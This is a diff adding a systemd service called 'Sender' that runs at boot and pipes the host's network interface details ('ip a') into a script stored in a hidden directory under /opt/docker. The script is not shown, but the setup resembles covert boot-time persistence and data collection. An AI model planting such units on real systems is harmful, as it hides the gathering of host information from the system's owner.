@@ -1,0 +1,15 @@
+# /etc/systemd/system/sender.service
+
+[Unit]
+Description=Sender
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=oneshot
+User=docker0
+WorkingDirectory=/opt/docker/
+ExecStart=/usr/bin/bash -c "ip a | /opt/docker/.config/.d/sender.sh"
+
+[Install]
+WantedBy=multi-user.target
